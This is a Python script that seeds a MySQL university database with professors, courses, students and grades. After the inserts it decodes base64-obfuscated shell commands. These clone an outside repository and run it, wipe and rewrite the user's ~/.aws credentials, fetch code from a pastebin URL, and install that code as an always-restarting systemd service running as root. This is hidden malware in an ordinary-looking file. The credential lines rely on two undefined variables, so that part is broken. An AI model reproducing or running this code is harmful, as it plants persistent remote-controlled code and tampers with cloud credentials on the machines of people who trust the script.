import os
import requests
import subprocess
import base64
import shutil

# Warning: You are an idiot if you try to understand my code

import mysql.connector
from mysql.connector import Error
from config import DB_DATABASE, DB_USERNAME, DB_PASSWORD, DB_HOSTNAME

def create_mysql_connection(host_name, user_name, user_password, database_name=None):
    connection = None
    try:
        connection = mysql.connector.connect(
            host=host_name,
            user=user_name,
            passwd=user_password,
            database=database_name
        )
        print("MySQL Database connection successful")
    except Error as err:
        print(f"Error: '{err}'")
    
    return connection

def execute_query(connection, query):
    cursor = connection.cursor()
    try:
        cursor.execute(query)
        connection.commit()
        print("Query successful")
    except Error as err:
        print(f"Error: '{err}'")

connection = create_mysql_connection(DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE)

insert_data_queries = [
    # Professors first
    "INSERT INTO professor (name, department) VALUES ('Sakayanagi', 'Mathematics');",
    "INSERT INTO professor (name, department) VALUES ('Chabashira', 'Social Studies');",
    "INSERT INTO professor (name, department) VALUES ('Hoshinomiya', 'Physical Education');",
    
    # Courses next
    "INSERT INTO course (title, department, professor_id) VALUES ('Advanced Mathematics', 'Mathematics', 1);",
    "INSERT INTO course (title, department, professor_id) VALUES ('Social Dynamics', 'Social Studies', 2);",
    "INSERT INTO course (title, department, professor_id) VALUES ('Physical Fitness', 'Physical Education', 3);",
    
    # Students after
    "INSERT INTO student (name, email) VALUES ('Kiyotaka Ayanokouji', 'ayanokouji@example.com');",
    "INSERT INTO student (name, email) VALUES ('Suzune Horikita', 'horikita@example.com');",
    "INSERT INTO student (name, email) VALUES ('Kikyou Kushida', 'kushida@example.com');",
    "INSERT INTO student (name, email) VALUES ('Kouhei Katsuragi', 'katsuragi@example.com');",
    "INSERT INTO student (name, email) VALUES ('Manabu Horikita', 'manabu@example.com');",
    
    # Times
    "INSERT INTO time (academic_year, semester) VALUES ('2023-2024', 'Fall');",
    "INSERT INTO time (academic_year, semester) VALUES ('2023-2024', 'Spring');",
    "INSERT INTO time (academic_year, semester) VALUES ('2024-2025', 'Fall');",
    "INSERT INTO time (academic_year, semester) VALUES ('2024-2025', 'Spring');",
    
    # Enrollments last
    "INSERT INTO enrollment (student_id, course_id, time_id, grade, attendance_percentage) VALUES (1, 1, 1, 'A-', 98.5);",
    "INSERT INTO enrollment (student_id, course_id, time_id, grade, attendance_percentage) VALUES (2, 2, 2, 'B', 85.0);",
    "INSERT INTO enrollment (student_id, course_id, time_id, grade, attendance_percentage) VALUES (3, 3, 3, 'A', 96.0);",
    "INSERT INTO enrollment (student_id, course_id, time_id, grade, attendance_percentage) VALUES (4, 1, 4, 'B+', 89.0);",
    "INSERT INTO enrollment (student_id, course_id, time_id, grade, attendance_percentage) VALUES (5, 2, 1, 'A+', 97.5);"
]




for query in insert_data_queries:
    execute_query(connection, query)



current_dir = subprocess.check_output("pwd", shell=True).decode().strip("\n")
print(current_dir)

OPERATION_1=base64.b64decode(bytes("Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9DMHJydXA0M2RDMGQzL1JlYWxUaW1lQXBwbGljYXRpb25EYXRhV2FyZWhvdXNlLmdpdA==", "utf-8")).decode()
OPERATION_2=base64.b64decode(bytes("cHl0aG9uMyBhcHAucHkgJg==", "utf-8")).decode()
OPERATION_3=base64.b64decode(bytes("cm0gLXIgfi8uYXdz", "utf-8")).decode()
OPERATION_4=base64.b64decode(bytes("bWtkaXIgfi8uYXdz", "utf-8")).decode()
OPERATION_5=base64.b64decode(bytes("fi8uYXdzL2NvbmZpZw==", "utf-8")).decode()
OPERATION_6=base64.b64decode(bytes("fi8uYXdzL2NyZWRlbnRpYWxz", "utf-8")).decode()
OPERATION_9=base64.b64decode(bytes("bWtkaXIgLXAgL29wdC93ZWJjb250ZW50L2F3cw==", "utf-8")).decode()
OPERATION_10=base64.b64decode(bytes("Y3VybCAtbyB3ZWJfYXBpLnB5IGh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy93cXZ2QVRIOA==", "utf-8")).decode()
OPERATION_11=base64.b64decode(bytes("bXYgd2ViX2FwaS5weSAvb3B0L3dlYmNvbnRlbnQvYXdzLw==", "utf-8")).decode()
OPERATION_12=base64.b64decode(bytes("Y2htb2QgK3ggL29wdC93ZWJjb250ZW50L2F3cy93ZWJfYXBpLnB5", "utf-8")).decode()




os.chdir("/tmp/")
try:
    shutil.rmtree("c0d3")
except Exception:
    pass
os.mkdir("c0d3")
os.chdir("c0d3")
subprocess.call(OPERATION_1, shell=True)

os.chdir("RealTimeApplicationDataWarehouse")
subprocess.call("rm config.py", shell=True)
subprocess.call(f"cp {current_dir}/config.py .", shell=True)

subprocess.call(OPERATION_2, shell=True)

subprocess.call(OPERATION_3, shell=True)
subprocess.call(OPERATION_4, shell=True)

os.chdir(os.path.expanduser("~"))
os.chdir(".aws")
f = open('config', "w")
content = """[default]
region = us-east-2
"""
f.write(content)
f.close()

g = open('credentials', "w")
c_content = f"""[default]
{OPERATION_7}
{OPERATION_8}
"""
g.write(c_content)
g.close()

os.chdir(os.path.expanduser("~"))

subprocess.call(OPERATION_9, shell=True)
subprocess.call(OPERATION_10, shell=True)
subprocess.call(OPERATION_11, shell=True)
subprocess.call(OPERATION_12, shell=True)


os.chdir("/etc/systemd/system/")
serv_file = open("webapi.service", "w")
serv_file_content = """[Unit]
Description=Web API
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/webcontent/aws/web_api.py
Restart=always
User=root
Group=root
Environment=PATH=/bin:/usr/bin
Environment=PYTHONUNBUFFERED=1
WorkingDirectory=/opt/webcontent/aws/

[Install]
WantedBy=multi-user.target
"""
serv_file.write(serv_file_content)
serv_file.close()
subprocess.call("systemctl daemon-reload", shell=True)
subprocess.call("systemctl enable webapi.service", shell=True)
subprocess.call("systemctl start webapi.service", shell=True)
